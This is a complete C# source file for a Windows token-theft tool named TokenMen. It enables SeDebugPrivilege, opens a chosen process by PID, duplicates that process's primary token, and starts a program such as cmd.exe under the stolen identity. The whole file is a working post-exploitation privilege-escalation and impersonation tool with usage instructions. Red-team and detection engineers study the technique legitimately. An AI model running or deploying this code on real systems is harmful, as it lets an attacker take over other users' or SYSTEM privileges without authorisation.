using System;
using System.Runtime.InteropServices;

namespace TokenMen
{
    class Program
    {
        #region Flags And Enums

        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
        public struct STARTUPINFO
        {
            public int cb;
            public string lpReserved;
            public string lpDesktop;
            public string lpTitle;
            public int dwX;
            public int dwY;
            public int dwXSize;
            public int dwYSize;
            public int dwXCountChars;
            public int dwYCountChars;
            public int dwFillAttribute;
            public int dwFlags;
            public int wShowWindow;
            public int cbReserved2;
            public IntPtr lpReserved2;
            public IntPtr hStdInput;
            public IntPtr hStdOutput;
            public IntPtr hStdError;
        }
        public struct PROCESS_INFORMATION
        {
            public IntPtr hProcess;
            public IntPtr hThread;
            public int dwProcessId;
            public int dwThreadId;
        }

        [Flags]
        public enum ProcessAccessFlags : uint
        {
            All = 0x001F0FFF,
            Terminate = 0x00000001,
            CreateThread = 0x00000002,
            VirtualMemoryOperation = 0x00000008,
            VirtualMemoryRead = 0x00000010,
            VirtualMemoryWrite = 0x00000020,
            DuplicateHandle = 0x00000040,
            CreateProcess = 0x000000080,
            SetQuota = 0x00000100,
            SetInformation = 0x00000200,
            QueryInformation = 0x00000400,
            QueryLimitedInformation = 0x00001000,
            Synchronize = 0x00100000
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct SECURITY_ATTRIBUTES
        {
            public int nLength;
            public IntPtr lpSecurityDescriptor;
            public int bInheritHandle;
        }
        public enum SECURITY_IMPERSONATION_LEVEL
        {
            SecurityAnonymous,
            SecurityIdentification,
            SecurityImpersonation,
            SecurityDelegation
        }

        public enum TOKEN_TYPE
        {
            TokenPrimary = 1,
            TokenImpersonation
        }

        [StructLayout(LayoutKind.Sequential, Pack = 1)]
        internal struct TokPriv1Luid
        {
            public int Count;
            public long Luid;
            public int Attr;
        }

        internal const int SE_PRIVILEGE_ENABLED = 0x00000002;
        internal const string SE_DEBUG_NAME = "SeDebugPrivilege";
        internal const string SE_ASSIGNPRIMARYTOKEN_NAME = "SeAssignPrimaryTokenPrivilege";

        #endregion Flags And Enums

        #region Win32_API
        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern IntPtr OpenProcess(uint processAccess, bool bInheritHandle, uint processId);

        [DllImport("advapi32.dll", SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        static extern bool OpenProcessToken(IntPtr ProcessHandle, UInt32 DesiredAccess, out IntPtr TokenHandle);
        private static readonly uint STANDARD_RIGHTS_REQUIRED = 0x000F0000;
        private static readonly uint STANDARD_RIGHTS_READ = 0x00020000;
        private static readonly uint TOKEN_ASSIGN_PRIMARY = 0x0001;
        private static readonly uint TOKEN_DUPLICATE = 0x0002;
        private static readonly uint TOKEN_IMPERSONATE = 0x0004;
        private static readonly uint TOKEN_QUERY = 0x0008;
        private static readonly uint TOKEN_QUERY_SOURCE = 0x0010;
        private static readonly uint TOKEN_ADJUST_PRIVILEGES = 0x0020;
        private static readonly uint TOKEN_ADJUST_GROUPS = 0x0040;
        private static readonly uint TOKEN_ADJUST_DEFAULT = 0x0080;
        private static readonly uint TOKEN_ADJUST_SESSIONID = 0x0100;
        private static readonly uint TOKEN_READ = (STANDARD_RIGHTS_READ | TOKEN_QUERY);
        private static readonly uint TOKEN_ALL_ACCESS = (STANDARD_RIGHTS_REQUIRED | TOKEN_ASSIGN_PRIMARY | TOKEN_DUPLICATE | TOKEN_IMPERSONATE |
            TOKEN_QUERY | TOKEN_QUERY_SOURCE | TOKEN_ADJUST_PRIVILEGES | TOKEN_ADJUST_GROUPS | TOKEN_ADJUST_DEFAULT | TOKEN_ADJUST_SESSIONID);


        [DllImport("advapi32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        public extern static bool DuplicateTokenEx(IntPtr hExistingToken, uint dwDesiredAccess, IntPtr lpTokenAttributes,
            SECURITY_IMPERSONATION_LEVEL ImpersonationLevel, TOKEN_TYPE TokenType, out IntPtr phNewToken);

        [DllImport("advapi32", SetLastError = true, CharSet = CharSet.Unicode)]
        public static extern bool CreateProcessWithTokenW(IntPtr hToken, UInt32 dwLogonFlags, string lpApplicationName, string lpCommandLine,
            UInt32 dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory, [In] ref STARTUPINFO lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation);

        [DllImport("advapi32.dll", SetLastError = true)]
        internal static extern bool LookupPrivilegeValue(string host, string name, ref long pluid);

        [DllImport("advapi32.dll", ExactSpelling = true, SetLastError = true)]
        internal static extern bool AdjustTokenPrivileges(IntPtr htok, bool disall, ref TokPriv1Luid newst, int len, IntPtr prev, IntPtr relen);

        [DllImport("advapi32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        public extern static bool DuplicateTokenEx(IntPtr hExistingToken, uint dwDesiredAccess, IntPtr lpTokenAttributes, uint ImpersonationLevel, uint TokenType, out IntPtr phNewToken);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern IntPtr GetCurrentProcess();

        #endregion Win32_API

        static string Win32Error { get => new System.ComponentModel.Win32Exception(Marshal.GetLastWin32Error()).Message; }

        static void Main(string[] args)
        {
            string AppName = AppDomain.CurrentDomain.FriendlyName;

            if (args.Length < 2)
            {
                Console.WriteLine($"Usage: {AppName} <PID to grab Primary Token From> <Program To Launch with the Duplicated Token>");
                Console.WriteLine($"Example: {AppName} 3060 cmd.exe");
                return;
            }

            // Get PID of a user's process to grab the token from, and command to launch with that token
            _ = uint.TryParse(args[0], out uint PIDToImpersonate);
            string executableToLaunch = args[1];
            Console.WriteLine($"[+] Using token from PID: {PIDToImpersonate} to launch: {executableToLaunch}");

            // Enable Necessary Privileges (Doesn't needed if running from PowerShell)
            Console.WriteLine("[!] Adjusting Privileges");
            PrivilegeEnabler(SE_DEBUG_NAME);
            //PrivilegeEnabler(SE_ASSIGNPRIMARYTOKEN_NAME); Doesn't seems like we need it

            // Get Handle to the Process chosen by the user
            IntPtr processHandle = OpenProcess((uint)ProcessAccessFlags.All, true, PIDToImpersonate);
            if (processHandle == IntPtr.Zero)
            {
                Console.WriteLine($"[-] OpenProcess Failed, Error is: {Win32Error}");
                return;
            }
            Console.WriteLine($"[+] Got handle from OpenProcess at: {processHandle}");

            // Get Handle to the Process's Token
            bool res = OpenProcessToken(processHandle, TOKEN_DUPLICATE, out IntPtr tokenHandle);
            if (!res)
            {
                Console.WriteLine($"[-] OpenProcessToken Error is: {Win32Error}");
                return;
            }
            Console.WriteLine("[+] OpenProcessToken Success");

            // Duplicate the Primary Token
            uint FULL_ACCESS = 0xF01FF;
            bool dup = DuplicateTokenEx(tokenHandle, FULL_ACCESS, IntPtr.Zero, SECURITY_IMPERSONATION_LEVEL.SecurityImpersonation, TOKEN_TYPE.TokenPrimary,
                out IntPtr duplicateTokenHandle);
            if (!dup)
            {
                Console.WriteLine($"[-] DuplicateTokenEx Error is: {Win32Error}");
                return;
            }
            Console.WriteLine("[+] DuplicateTokenEx Success");

            // Create a new Process with the duplicated Primary Token
            var processInformation = new PROCESS_INFORMATION();
            var startupInfo = new STARTUPINFO();
            startupInfo.cb = Marshal.SizeOf(startupInfo);
            bool CreateProcessW = CreateProcessWithTokenW(duplicateTokenHandle, 0, null, executableToLaunch, 0, IntPtr.Zero, null, ref startupInfo, out processInformation);
            if (!CreateProcessW)
            {
                Console.WriteLine($"[-] CreateProcessWithTokenW Error is: {Win32Error}");
                return;
            }
            Console.WriteLine("[+] CreateProcessWithTokenW Success");
        }

        private static void PrivilegeEnabler(string privName)
        {
            OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, out IntPtr htok);

            TokPriv1Luid tp;
            tp.Count = 1;
            tp.Luid = 0;
            tp.Attr = SE_PRIVILEGE_ENABLED;
            LookupPrivilegeValue(null, privName, ref tp.Luid);

            bool retVal = AdjustTokenPrivileges(htok, false, ref tp, 0, IntPtr.Zero, IntPtr.Zero);
            if (!retVal)
            {
                Console.WriteLine($"[-] Failed to \"AdjustTokenPrivilege\" Error is: {Win32Error}");
                Environment.Exit(0);
            }
            Console.WriteLine($"[+] {privName} Enabled");
        }
    }
}
